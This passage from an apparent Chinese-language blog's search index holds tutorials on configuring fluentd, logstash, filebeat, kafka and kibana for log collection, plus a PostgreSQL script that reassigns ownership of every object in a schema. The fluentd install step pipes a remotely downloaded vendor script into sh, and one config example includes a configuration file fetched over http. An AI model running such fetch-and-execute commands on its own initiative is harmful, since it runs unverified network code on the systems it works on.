72820-tetd7qoj5d.png ","date":"2020-06-01 13:47","objectID":"/post/1752/:4:0","tags":["elk"],"title":"fluentd格式化format（六）","uri":"/post/1752/"},{"categories":["系统服务","ELK日志收集"],"content":"buffer区块必须位于match区块内，指定如何对事件进行缓冲（避免对输出的目的地造成压力）。Fluentd内置了两种缓冲插件：memory、file。 buffer区块使用@type 参数来指定缓冲区插件的类型，如果省略@type，将使用输出插件指定的默认缓冲区插件，或者使用memory插件。 \u003cbuffer\u003e @type file \u003c/buffer\u003e ","date":"2020-05-29 18:29","objectID":"/post/1739/:0:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"区块键： 为buffer指定一个区块键。有效的值可以是逗号分隔的字符串或空值。 空白区块键： 当指定了空的区块键(并且输出插件没有指定默认的区块键) ，输出插件将所有匹配的事件写入一个buffer区块中，直到其大小满为止。 \u003cmatch tag.**\u003e # ... \u003cbuffer\u003e # ... \u003c/buffer\u003e \u003c/match\u003e # No chunk keys: All events will be appended into the same chunk. 11:59:30 web.access {\"key1\":\"yay\",\"key2\":100} --| | 12:00:01 web.access {\"key1\":\"foo\",\"key2\":200} --|---\u003e CHUNK_A | 12:00:25 ssh.login {\"key1\":\"yay\",\"key2\":100} --| tag： 当tag被指定为缓冲区块键时，同一个tag对应一个缓冲区。 \u003csource\u003e @type tail path /var/log/messages tag os.messages pos_file /tmp/messages.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch os.**\u003e @type file path /opt/demo1/demo1-${tag}.log \u003cbuffer tag\u003e @type file path /tmp/demo1.buffer timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e 可以看到被分为两个缓冲文件了 \u003cimg src=“images/c612db3efe75bb0d08da551651d4398a.png “c612db3efe75bb0d08da551651d4398a”” /\u003e Time： 当区块键为time时，会根据timekey的时间来分配不同的缓冲区，在timekey_wait指定的时间刷出缓冲区。 可以看下下面的例子，每60会分配一个新的缓冲区，延迟5秒后刷出 \u003csource\u003e @type tail path /var/log/messages tag os.messages pos_file /tmp/messages.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch os.**\u003e @type file path /opt/demo1 \u003cbuffer time\u003e @type file timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e 根据不同时间输出到新的日志文件中 \u003cimg src=“images/9ad915089f910dd1f26cba468dfc67f8.png “9ad915089f910dd1f26cba468dfc67f8\"” /\u003e 其他区块键： 当指定其他(非time/tag)键时，这些键将作为记录的字段名处理。 输出插件将根据这些字段的值将事件分成块。 可以看下下面这个例子。 \u003csource\u003e @type tail path /var/log/messages tag os.messages exclude_path [\"/var/log/*.gz\", \"/var/log/*.zip\"] refresh_interval 60 pos_file /tmp/os.pos \u003cparse\u003e @type syslog \u003c/parse\u003e \u003c/source\u003e \u003csource\u003e @type tail path /var/log/secure tag os.secure pos_file /tmp/secure.pos \u003cparse\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cfilter os.**\u003e @type record_transformer \u003crecord\u003e hostname \"#{Socket.gethostname}\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch os.**\u003e @type file path /opt/demo1/demo1-${host}.log \u003cbuffer host\u003e @type file path /tmp/demo1.buffer timekey 60 timekey_wait 5 \u003c/buffer\u003e \u003c/match\u003e 文件名称中的${host}，被替换为日志记录中的host字段 \u003cimg src=“images/b1307b977468287d10ad8d8b816e8363.png “b1307b977468287d10ad8d8b816e8363\"” /\u003e 可以使用记录访问器语法来使用嵌套字段 \u003cbuffer $.nest.field\u003e # 访问记录的nest.field字段 组合键 缓冲区块键可以指定2个或更多的键——事件将通过块键值的组合被分割成块 # \u003cbuffer tag,time\u003e 11:58:01 ssh.login {\"key1\":\"yay\",\"key2\":100} ------\u003e CHUNK_A 11:59:13 web.access {\"key1\":\"yay\",\"key2\":100} --| |---\u003e CHUNK_B 11:59:30 web.access {\"key1\":\"yay\",\"key2\":100} --| 12:00:01 web.access {\"key1\":\"foo\",\"key2\":200} ------\u003e CHUNK_C 12:00:25 ssh.login {\"key1\":\"yay\",\"key2\":100} ------\u003e CHUNK_D 空键 当输出插件有默认的块键时，禁用它 \u003cmatch tag.**\u003e # ... \u003cbuffer []\u003e # ... \u003c/buffer\u003e \u003c/match\u003e ","date":"2020-05-29 18:29","objectID":"/post/1739/:1:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"占位符 当指定区块键时，可以使用区块键作为变量使用。 这取决于插件是否对配置值应用方法(extract_placeholders)。 \u003cmatch log.*\u003e @type file path /data/${tag}/access.${key1}.log #=\u003e \"/data/log.map/access.yay.log\" \u003cbuffer tag,key1\u003e # ... \u003c/buffer\u003e \u003c/match\u003e ##区块键参数time timekey：必须，没有默认值。输出插件将在指定的时间刷新块，在区块键是time的时候使用 timekey_wait：默认600s，输出插件在timekey时间后的timekey_wait秒后写入块 timekey_use_utc：默认false，是否使用utc时间 timekey_zone：默认本地时区，可以使用例如+0800或Asia/Shanghai ","date":"2020-05-29 18:29","objectID":"/post/1739/:2:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"缓冲参数 chunk_limit_size: 默认值内存8MB，文件256MB，每个块的最大大小 chunk_limit_records: 每个区块可以存储的最大事件数 total_limit_size: 默认值内存512MB，文件64GB，此缓冲插件示例的总大小限制 queue_limit_length: 默认0，此缓冲区插件实例的队列长度限制 chunk_full_threshold: 默认0.95(95%)，刷新缓冲块的阈值百分比，chunk_limit_size * chunk_full_threshold(8M*0.95),也就是缓冲块占用超过95%刷出. queued_chunks_limit_size: 默认值1，限制队列区块的数量。 compress: 默认：text不压缩，可以使用gzip压缩 ","date":"2020-05-29 18:29","objectID":"/post/1739/:3:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"刷新参数 flush_at_shutdown: 默认值:对于持久性缓冲区（例如buf_file）为false，对于非持久性缓冲区（例如buf_memory）为true。是否在关闭时刷新/写入所有缓冲区块的值 flush_mode： lazy: 根据timekey interval: 每隔flush_interval刷新一次 immediate: 事件进入缓冲块后立即刷空 flush_interval 默认60s flush_thread_count： 默认1，刷新块的线程数，用于并行刷新缓冲块 flush_thread_interval： 默认1，如果没有缓冲块等待被刷出，线程休眠几秒以进行下一次尝试 flush_thread_burst_interval： 默认1，输出插件刷新相邻的缓冲块时，启动下一个进程前休眠的秒数 delayed_commit_timeout： 默认60，输出插件确定异步写入操作失败的超时秒数 overflow_action： 当缓冲队列满了，输出插件的行为： 默认：throw_exception throw_exception：排除异常，并打印错误日志 block：阻止输入插件将事件发送到该缓冲区 drop_oldest_chunk：删除最旧的缓冲块以接受新传入的缓冲块 ","date":"2020-05-29 18:29","objectID":"/post/1739/:4:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"重试参数 retry_timeout： 默认72h，失败后重试刷新的最大时间 retry_forever： 默认false，是否永远重试 retry_max_times： 失败时重试刷新的最大次数 retry_type： 重试类型 默认: exponential_backoff exponential_backoff: 等待秒数,将根据故障成倍增长，由retry_exponential_backoff_base决定 periodic: 固定间隔重试retry_wait retry_wait： 默认1s,在下一次重试刷新之前要等待的秒数 retry_exponential_backoff_base： 默认2，重试的指数的基数 retry_randomize： 默认true，如果为true，则输出插件将在随机间隔后重试，可以防止突发 disable_chunk_backup： 默认false，禁止将不可恢复的数据块存储在备份目录中 ","date":"2020-05-29 18:29","objectID":"/post/1739/:5:0","tags":[],"title":"fluentd缓冲区Buffer（五）","uri":"/post/1739/"},{"categories":["系统服务","ELK日志收集"],"content":"官方文档：https://docs.fluentd.org/configuration/parse-section Parse区块来指定如何解析原始数据。Parse可以在,,区块使用。为他们提供解析的功能。 \u003csource\u003e @type tail # parameters for input plugin \u003cparse\u003e # parse section parameters \u003c/parse\u003e \u003c/source\u003e 下面是一些内置的解析器类型： regexp apache2 apache_error nginx syslog csv tsv ltsv json multiline none 通过@type参数来指定解析器插件的类型 \u003cparse\u003e @type apache2 \u003c/parse\u003e ","date":"2020-05-28 17:10","objectID":"/post/1723/:0:0","tags":["elk","efk","fluentd"],"title":"fluentd数据解析Parse（四）","uri":"/post/1723/"},{"categories":["系统服务","ELK日志收集"],"content":"解析器的参数(可选)： types(hash类型-kv)：用于将字段转换为其他类型 默认：无 字符串转换：field1:type, field2:type, field3:type:option, field4:type:option json转换：{\"field1\":\"type\", \"field2\":\"type\", \"field3\":\"type:option\", \"field4\":\"type:option\"} 示例：types user_id:integer,paid:bool,paid_usd_amount:float 支持的字段类型：string、bool、integer、float、time、array time_key(字符串类型)：从事件的什么字段中获取时间，如果该字段不存在，则取当前时间 null_empty_string：将空值替换为nil，默认为false estimate_current_event(布尔型)：是否以当前时间作为time_key的值，默认false keep_time_key(布尔型)：是否保留事件中的时间字段 timeout：检测错误的正则表达式匹配超时时间。 下面是一个解析nginx访问日志的简单示例 \u003csource\u003e @type tail path /path/to/input/file \u003cparse\u003e @type nginx keep_time_key true \u003c/parse\u003e \u003c/source\u003e ###时间参数： time_type：enum 可选值：float：UNIX时间.纳秒、unixtime： UNIX时间（秒）、string：根据后面几个参数决定具体格式 time_format：string 参考Ruby API：时间格式化、时间解析，除了遵循Ruby的时间格式化，还可以取值%iso8601 localtime：bool 是否使用本地时间而非UTC，默认true utc：bool 是否使用UTC而非本地时间，默认false timezone：string 指定时区，例如+09:00、+0900、+09、Asia/Shanghai ","date":"2020-05-28 17:10","objectID":"/post/1723/:0:1","tags":["elk","efk","fluentd"],"title":"fluentd数据解析Parse（四）","uri":"/post/1723/"},{"categories":["系统服务","ELK日志收集"],"content":"一些通用参数可用于所有（或部分）Fluentd插件。 1.@type：指定插件类型 \u003csource\u003e @type my_plugin_type \u003c/source\u003e \u003cfilter\u003e @type my_filter \u003c/filter\u003e 2.@id：指定插件 id，在输出监控信息的时候有用。 \u003cmatch\u003e @type file @id service_www_accesslog path /path/to/my/access.log # ... \u003c/match\u003e 3.@log_level：此参数用于指定插件特定的日志记录级别。默认日志级别为info。全局日志级别可以由\u003csystem\u003e中的日志级别或-v/-q命令行选项指定。@log_level参数只覆盖指定插件实例的日志记录级别。 \u003csystem\u003e log_level info \u003c/system\u003e \u003csource\u003e # ... @log_level debug # show debug log only for this plugin \u003c/source\u003e 4.@label：将输入事件路由到\u003clabel\u003e、\u003cfilter\u003e和\u003cmatch\u003e区块的集合。 \u003csource\u003e @type ... @label @access_logs # ... \u003c/source\u003e \u003csource\u003e @type ... @label @system_metrics # ... \u003c/source\u003e \u003clabel @access_log\u003e \u003cmatch **\u003e @type file path ... \u003c/match\u003e \u003c/label\u003e \u003clabel @system_metrics\u003e \u003cmatch **\u003e @type file path ... \u003c/match\u003e \u003c/label\u003e @label参数的值必须以@开头。强烈建议指定@label将事件路由到任何插件。它可以使整个配置变得简单。 ","date":"2020-05-27 18:07","objectID":"/post/1717/:0:0","tags":["elk","efk","fluentd"],"title":"fluentd通用参数（三）","uri":"/post/1717/"},{"categories":["系统服务","ELK日志收集"],"content":"原文链接：https://lintingbin2009.github.io/2018/05/01/fluentd%E8%AF%AD%E6%B3%95%E9%80%9F%E8%AE%B0/ 官方文档：https://docs.fluentd.org/configuration/config-file ","date":"2020-05-27 15:13","objectID":"/post/1711/:0:0","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"配置文件语法 ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:0","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"Fluentd事件的生命周期 1.每个输入的事件会带有一个tag 2.Fluentd通过tag匹配output 3.Fluentd发送事件到匹配的output 4.Fluentd支持多个数据源和数据输出 5.通过过滤器，事件可以被重新触发 ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:1","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"1. “source”: 定义数据源 数据源可以在source指令中定义，比如我们可以定义http和forward的数据源。http数据源可以通过http协议来接收数据，forward可以通过tcp协议来接收数据。 # Receive events from 24224/tcp # This is used by log forwarding and the fluent-cat command \u003csource\u003e @type forward port 24224 \u003c/source\u003e # http://this.host:9880/myapp.access?json={\"event\":\"data\"} \u003csource\u003e @type http port 9880 \u003c/source\u003e 所有source指令中必须包含@type参数，该参数用来指定使用哪个输入插件，比如我们还可以用tail插件来读取文件的内容。 路由 source指令把事件提交到Fluentd的路由引擎。一个事件由三个实体组成：tag、time和record。tag是由’.’分割的字符串组成，被内部路由引擎使用。time由input插件指定，必须是Unix时间戳格式。record是一个Json对象。 ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:2","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"2.“match”: 定义数据的输出目标 match指令通过匹配tag字段来将事件输出到其他的系统。同样match指令也必须指定@type参数，该参数用来指定使用哪个输出插件。在下面的例子中，只有myapp.access的tag能够匹配到该输出插件。 \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e 匹配模式 下面的这些匹配模式可以在中使用，用来匹配tag: *用来匹配tag的一部分（比如：a.*可以匹配a.b，但是不能匹配a或者a.b.c） **可以用来匹配tag的0个或多个部分（比如：a.**可以匹配a、a.b和a.b.c） {X,Y,Z}匹配X,Y或者Z（比如：{a,b}可以匹配a和b，但是不能匹配c。他可以和*或者**结合起来一起使用。） 如果有多个匹配模式写在里面，则可以用空格分开(比如：\u003cmatch a b\u003e能够匹配a和b。\u003cmatch a.** b.* \u003e能够匹配a,a.b,a.b.c和b.d。) 匹配顺序 Fluentd是按顺序匹配的，先在配置文件里面出现的match会先匹配。下面的例子中myapp.access永远都不会被匹配到。 # ** matches all tags. Bad :( \u003cmatch **\u003e @type blackhole_plugin \u003c/match\u003e \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:3","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"3.“filter”：事件处理管道 “filter”指令的语法和”match”指令的语法相同，但是”filter”能够在管道中被连起来处理，如下所示： Input -\u003e filter 1 -\u003e ... -\u003e filter N -\u003e Output\u003c/code\u003e\u003c/pre\u003e 下面的例子展示了record_transformer fliter的用法。source首先会接收到一个{“event”:”data”}的事件，然后该事件会首先被路由到filter，filter会增加一个host_param的字段到record中，然后再把该事件发送到match中。 # http://this.host:9880/myapp.access?json={\"event\":\"data\"} \u003csource\u003e @type http port 9880 \u003c/source\u003e \u003cfilter myapp.access\u003e @type record_transformer \u003crecord\u003e host_param \"#{Socket.gethostname}\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch myapp.access\u003e @type file path /var/log/fluent/access \u003c/match\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:4","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"4.“system”：设置系统范围配置(更详细的选项https://docs.fluentd.org/deployment/system-config) 以下的配置能够由”system”指令指定。也可以通过Fluentd的命令行配置选项设置相同的配置: log_level suppress_repeated_stacktrace emit_error_log_interval suppress_config_dump without_source process_name (只能用”system”指令指定) 下面是一个简单的例子： \u003csystem\u003e # 等同于-qq选项。 (-v: debug, -vv: trace，-q: warn, -qq: error) log_level error # 等同于--without-source选项 without_source # ... \u003c/system\u003e process_name参数表示修改fluentd的supervisor和worker进程名称 \u003csystem\u003e process_name fluentd1 \u003c/system\u003e ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:5","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"5.“label”：用来组织filter和match “label”指令用来降低tag路由的复杂度，通过”label”指令可以用来组织filter和match的内部路由。下面是一个配置的例子，由于”label”是内建的插件，所以他的参数需要以@开头。 \u003csource\u003e @type forward \u003c/source\u003e \u003csource\u003e @type tail @label @SYSTEM \u003c/source\u003e \u003cfilter access.**\u003e @type record_transformer \u003crecord\u003e # ... \u003c/record\u003e \u003c/filter\u003e \u003cmatch **\u003e @type elasticsearch # ... \u003c/match\u003e \u003clabel @SYSTEM\u003e \u003cfilter var.log.middleware.**\u003e @type grep # ... \u003c/filter\u003e \u003cmatch **\u003e @type s3 # ... \u003c/match\u003e \u003c/label\u003e 在上面的例子中，forward的数据源的事件被路由到record_transformer filter和elasticsearch output中。tail数据源被路由到@system里面的grep filter和s3 output中。 “label”对于不带标记前缀的事件流分离非常有用。 @ERROR label @ERROR label是内建的label，用来记录emit_error_event错误事件的。如果在配置文件里面设置了，当有相关的错误发生（比如：缓冲区已满或无效记录）的话，该错误事件就会被发送到\u003c label @ERROR \u003e。 ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:6","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"6.“@include”：重用配置 可以使用@include指令导入单独配置文件中的指令： # Include config files in the ./config.d directory @include config.d/*.conf @include指令支持常规文件路径、glob模式，和http URL约定： # absolute path @include /path/to/config.conf # 使用相对路径 @include extra.conf # glob match pattern @include config.d/*.conf # http @include http://example.com/fluent.conf 可以通过”@include”来导入其他的配置文件，配置文件是按顺序导入的。如果使用模式匹配的话，文件是按字母顺序导入的。 # If you have a.conf,b.conf,...,z.conf and a.conf / z.conf are important... # This is bad @include *.conf # This is good @include a.conf @include config.d/*.conf @include z.conf 如果导入的文件有顺序的要求的话，最好自己主动写导入的语句，模式匹配导入容易出错。 也可以在不同的区块中导入相同的配置@include /path/to/out_buf_params.conf # config file \u003cmatch pattern\u003e @type forward # other parameters... \u003cbuffer\u003e @type file path /path/to/buffer/forward @include /path/to/out_buf_params.conf \u003c/buffer\u003e \u003c/match\u003e \u003cmatch pattern\u003e @type elasticsearch # other parameters... \u003cbuffer\u003e @type file path /path/to/buffer/es @include /path/to/out_buf_params.conf \u003c/buffer\u003e \u003c/match\u003e # /path/to/out_buf_params.conf flush_interval 5s total_limit_size 100m chunk_limit_size 1m 支持的数据类型 每个插件都需要一些参数。例如：in_tail插件有rotate_wait和pos_file这两个参数。每个参数都有对应的类型与其关联。下面是这些类型的定义： string 类型：该类型被解析成一个字符串。string类型可以有三种形式：不带引号的字符串、带单引号的字符串和带双引号的字符串。 integer 类型：该类型被解析成一个整数。 float 类型：该类型被解析成一个浮点数。 size 类型：该类型用来解析成有多少个字节。可以在整数后面加上k/K、m/M、g/G、t/T，对应的是计算机学科的度量单位。比如：12k表示为12*1024后的数值。 time 类型：该类型被解析成时间。可以在浮点数后面加上s、m、h和d分别表示为秒、分、小时、天。可以用0.1表示100ms。 array 类型：该类型被解析成JSON数组。这种类型还支持缩写，比如：[“key1”, “key2”]可以缩写成key1,key2。 hash 类型：该类型被解析成JSON对象。这种类型也支持缩写，比如：{“key1”:”value1”, “key2”:”value2”}可以缩写成key1:value1,key2:value2。 ","date":"2020-05-27 15:13","objectID":"/post/1711/:1:7","tags":["elk","efk","fluentd"],"title":"fluentd配置文件语法(二)","uri":"/post/1711/"},{"categories":["系统服务","ELK日志收集"],"content":"1.安装 curl -L https://toolbelt.treasuredata.com/sh/install-redhat-td-agent3.sh | sh 2.启动 systemctl start td-agent.service 3.默认的配置文件中配置了http接收方式，监听得是8888端口，这里测试一条日志 debug.test：这个是tag，配置文件中的match来匹配这个tag，没有匹配到就不会输出日志 {“json”:“message”}：这个是模拟的日志内容 curl -X POST -d 'json={\"json\":\"message\"}' http://localhost:8888/debug.test tail /var/log/td-agent/td-agent.log ","date":"2020-05-27 14:57","objectID":"/post/1709/:0:0","tags":["fluentd"],"title":"fluentd安装入门(一)","uri":"/post/1709/"},{"categories":["系统服务","databases"],"content":"\\c 库名; DO $$ DECLARE r record; i int; v_schema text[] := '{public}'; v_new_owner varchar := '新的用户名'; BEGIN FOR r IN SELECT 'ALTER TABLE \"' || table_schema || '\".\"' || table_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.tables WHERE table_schema = ANY (v_schema) UNION ALL SELECT 'ALTER TABLE \"' || sequence_schema || '\".\"' || sequence_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.sequences WHERE sequence_schema = ANY (v_schema) UNION ALL SELECT 'ALTER TABLE \"' || table_schema || '\".\"' || table_name || '\" OWNER TO ' || v_new_owner || ';' AS a FROM information_schema.views WHERE table_schema = ANY (v_schema) UNION ALL SELECT 'ALTER FUNCTION \"' || nsp.nspname || '\".\"' || p.proname || '\"(' || pg_get_function_identity_arguments(p.oid) || ') OWNER TO ' || v_new_owner || ';' AS a FROM pg_proc p JOIN pg_namespace nsp ON p.pronamespace = nsp.oid WHERE nsp.nspname = ANY (v_schema) UNION ALL SELECT 'ALTER DATABASE \"' || current_database() || '\" OWNER TO ' || v_new_owner LOOP EXECUTE r.a; END LOOP; FOR i IN array_lower(v_schema, 1)..array_upper(v_schema, 1) LOOP EXECUTE 'ALTER SCHEMA \"' || v_schema[i] || '\" OWNER TO ' || v_new_owner; END LOOP; END $$; ","date":"2020-05-27 10:27","objectID":"/post/1707/:0:0","tags":["pgsql"],"title":"psql修改所有表的所有者","uri":"/post/1707/"},{"categories":["系统服务","ELK日志收集"],"content":"实现逻辑 filebeat ==\u003e\u003e kafka \u003c\u003c== logstash ==\u003e\u003e elastsearch \u003c== kibana filebeat配置 filebeat.inputs: - type: log enabled: true paths: - /var/log/messages fields: log_topic: test_kafka filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 3 output.kafka: enable: true hosts: [\"log1:9092\"] version: \"2.0.0\" topic: '%{[fields.log_topic]}' partition.round_robin: reachable_only: true worker: 1 required_acks: 1 compression: gzip compression_level: 4 max_message_bytes: 10000000 processors: - drop_fields: fields: - beat - host - input - source - offset - prospector 启动服务 logstash配置： input { kafka{ bootstrap_servers =\u003e \"log1:9092\" topics =\u003e [\"test_kafka\"] codec =\u003e \"json\" } } output { elasticsearch { hosts =\u003e \"log1:9200\" index =\u003e \"test_kafka-%{+YYYY.MM.dd}\" } } 启动服务 nohup ./logstash -f es.conf \u0026 3.使用kibana验证 可以手动模拟生成日志： echo \"手动echo测试\" \u003e\u003e /var/log/messages \u003cimg src=“images/83f81917c06bb350c01218aa6b363462.png “83f81917c06bb350c01218aa6b363462\"” /\u003e ","date":"2020-05-25 16:01","objectID":"/post/1701/:0:0","tags":["elk"],"title":"filebeat+kafka+logstash收集日志到es使用kibana展示","uri":"/post/1701/"},{"categories":["系统服务","ELK日志收集"],"content":"下载安装： wget https://artifacts.elastic.co/downloads/kibana/kibana-6.8.9-linux-x86_64.tar.gz tar xf kibana-6.8.9-linux-x86_64.tar.gz mv kibana-6.8.9-linux-x86_64 /usr/local/kibana cd /usr/local/kibana/ 修改配置： vim config/kibana.yml server.port: 5601 server.host: \"0.0.0.0\" elasticsearch.hosts: [\"http://localhost:9200\"] kibana.index: \".kibana\" 启动服务： nohup bin/kibana \u0026 ","date":"2020-05-25 15:52","objectID":"/post/1703/:0:0","tags":["elk"],"title":"kibana安装配置","uri":"/post/1703/"},{"categories":["系统服务","ELK日志收集"],"content":"logstash配置： input { beats { port =\u003e 5044 host =\u003e \"0.0.0.0\" } } output{ kafka{ bootstrap_servers =\u003e \"log1:9092\" topic_id =\u003e \"test_kafka\" } } 启动logstash nohup ./logstash -f test.conf \u0026 filebeat配置： filebeat.inputs: - type: log enabled: true paths: - /var/log/messages name: \"log1\" output.logstash: hosts: [\"10.0.0.6:5044\"] logging.level: debug 启动filebeat nohup ./filebeat -e -c filebeat.yml \u0026 新建一个终端生成日志，然后观察kafka \u003cimg src=“images/b7809c14a34cf387c608af4c32e27ebb.png “b7809c14a34cf387c608af4c32e27ebb”” /\u003e ","date":"2020-05-25 14:44","objectID":"/post/1699/:0:0","tags":["elk"],"title":"logstash使用filebeat作为日志源","uri":"/post/1699/"},{"categories":["系统服务","ELK日志收集"],"content":"1.命令行运行一个简单的输入输出 ./logstash -e 'input{stdin{}} output{stdout{codec=\u003erubydebug}}' \u003cimg src=“images/94b2a152a029900e008e03e19e6646b8.png “94b2a152a029900e008e03e19e6646b8\"” /\u003e 将上面的配置写到配置文件中，以配置文件的方式加载 vim test.conf input { stdin{} } output{ stdout{codec =\u003e rubydebug} } ./logstash -f test.conf 2.使用文件的方式收集日志 input { file{ path =\u003e \"/var/log/messages\" } } output{ stdout{codec =\u003e rubydebug} } ./logstash -f test.conf 新建一个终端链接查看是否有日志输出 \u003cimg src=“images/4b2c1626b8465ff5d9380aadabc9f4fe.png “4b2c1626b8465ff5d9380aadabc9f4fe”” /\u003e 2.1 将日志输出到kafka中 ./logstash -f test.conf input { file{ path =\u003e \"/var/log/messages\" } } output{ kafka{ bootstrap_servers =\u003e \"log1:9092\" topic_id =\u003e \"test_kafka\" } } 连接kafka消费端，新建终端看看效果 \u003cimg src=“images/5b058f4e3f77e98beb4c6f395471fbb5.png “5b058f4e3f77e98beb4c6f395471fbb5\"” /\u003e 后台方式运行logstash nohup ./logstash -f test.conf \u0026\u003e logstash.log \u0026 ","date":"2020-05-25 13:40","objectID":"/post/1695/:0:0","tags":["elk"],"title":"logstash配置(一)","uri":"/post/1695/"},{"categories":["ELK日志收集"],"content":"安装： wget https://artifacts.elastic.co/downloads/logstash/logstash-6.8.9.tar.gz tar xf logstash-6.8.9.tar.gz mv logstash-6.8.9 /usr/local/logstash 常用的input插件： 官方链接：https://www.elastic.co/guide/en/logstash/6.8/input-plugins.html file：读取一个文件，类似tail命令一行一行实时读取。 syslog：监听系统514端口的syslog messages。 redis：从redis读取数据。 kafka：从kafka中消费数据，一般用于数据量较大的业务场景。 filebeat：从filebeat中接收数据 常用的filter插件： grok：grok 是 logstash 最重要的插件,可以解析并结构化任意数据。支持正则，并提供了很多内置的规则和模板。 mutate：基础类型数据处理，包括类型转换、字符串处理、字段处理 date：转换日志中的时间格式 GeoIP：识别IP地址的地域信息、经纬度等。 常用的output插件： elasticsearch：输出到es中 file：输出到问价中 redis：输出到redis中 kafka：输出到kafka中 ","date":"2020-05-25 11:35","objectID":"/post/1689/:0:0","tags":["elk"],"title":"logstash6.8.9安装和常用插件说明","uri":"/post/1689/"},{"categories":["系统服务","ELK日志收集"],"content":"查看过滤之前的字段： \u003cimg src=“images/46f5a5911c14cb77f8d40b1ba1a771eb.png “46f5a5911c14cb77f8d40b1ba1a771eb”” /\u003e 修改filebeat配置文件，添加如下内容，删除掉不要的字段 processors: - drop_fields: fields: - beat - host - input - source - offset - prospector \u003cimg src=“images/f3a714a4c69654f7f56b0ce5c773bc11.png “f3a714a4c69654f7f56b0ce5c773bc11\"” /\u003e ","date":"2020-05-21 17:28","objectID":"/post/1686/:0:0","tags":["elk","efk"],"title":"filebeat字段过滤和加工","uri":"/post/1686/"},{"categories":["系统服务","ELK日志收集"],"content":"1.安装部署： wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-6.8.9-linux-x86_64.tar.gz tar xf filebeat-6.8.9-linux-x86_64.tar.gz mv filebeat-6.8.9-linux-x86_64 /usr/local/filebeat 2.查看配置文件： vim /usr/local/filebeat/filebeat.yml # 定义数据来源 filebeat.inputs: # 日志来源类型log、stdin、redis、等等 - type: log # 启用 enabled: true #指定日志路径，支持模糊匹配，如：/var/log/nginx/nginx*.log paths: - /var/log/messages - /var/log/secure #行过滤，以DBG开头的行不收集 #exclude_lines: ['^DBG'] #文件过滤，以gz结尾的文件不收集 #exclude_files: ['.gz$'] #增加字段 fields: # 定义tpoic的名称，方便发送到kafka不同的topic中 log_topic: osmessages #名称，从那个节点收集的日志 name: \"elk1\" #日志输出到kafka中 output.kafka: #启用 enabled: true #kafka集群地址 hosts: [\"elk1:9092\", \"elk2:9092\", \"elk3:9092\"] #kafka的版本 version: \"2.0.0\" topic: '%{[fields.log_topic]}' #使用轮询的方式写入到不同的partition。必须是 random, round_robin, hash 三种的一种，默认为 false partition.round_robin: reachable_only: true #发送消息给kafka的进程数 worker: 2 #ACK可靠性级别。0=无响应，1=等待本地提交，-1=等待所有副本提交。默认值为1。 required_acks: 1 #压缩方式 compression: gzip #压缩级别(1-9)，0为禁用 compression_level: 4 #JSON编码消息的最大允许大小。较大的将被丢弃。默认值为1000000（字节），10M。 max_message_bytes: 10000000 #设置日志级别，可选error, warning, info, debug logging.level: debug 3.启动filebeat cd /usr/local/filebeat/ nohup ./filebeat -e -c filebeat.yml \u0026 4.查看kafka： sh kafka-console-consumer.sh --bootstrap-server elk1:9092,elk2:9092,elk3:9092 --topic osmessage \u003cimg src=“images/8d9752fa3dd90bac96f4949877705213.png “8d9752fa3dd90bac96f4949877705213\"” /\u003e ","date":"2020-05-21 